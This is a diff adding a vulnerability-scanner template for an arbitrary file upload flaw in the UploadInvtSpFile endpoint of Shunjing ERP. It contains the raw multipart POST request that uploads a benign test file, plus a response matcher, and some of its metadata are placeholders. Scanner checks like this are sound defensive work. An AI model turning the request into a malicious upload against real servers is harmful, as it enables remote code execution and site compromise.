@@ -1,0 +1,28 @@
+id: sjerp-UploadInvtSpFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 顺景ERP管理系统UploadInvtSpFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference:
+    - https://mp.weixin.qq.com/s/BrbgHxUO4GJ0Haza5xf6dQ
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=-----------------1111
+        Content-Length: 182
+
+        -------------------1111
+        Content-Disposition: form-data; name="filedata"; filename="2142142142.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        -------------------1111--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
